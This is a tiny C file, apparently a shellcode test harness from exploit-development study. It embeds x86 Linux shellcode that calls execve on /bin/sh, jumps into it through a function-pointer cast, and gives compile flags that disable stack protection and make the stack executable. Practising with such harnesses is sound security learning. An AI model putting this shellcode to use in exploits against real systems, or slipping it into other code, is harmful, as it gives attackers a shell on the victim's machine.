// filename: vuln.c
#include<stdio.h>

int main()
{
  char shellcode[] = "\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";
   ( (void(*)())shellcode )();
  return 0;
}

// gcc -m32 -z execstack -fno-stack-protector -o vuln vuln.c
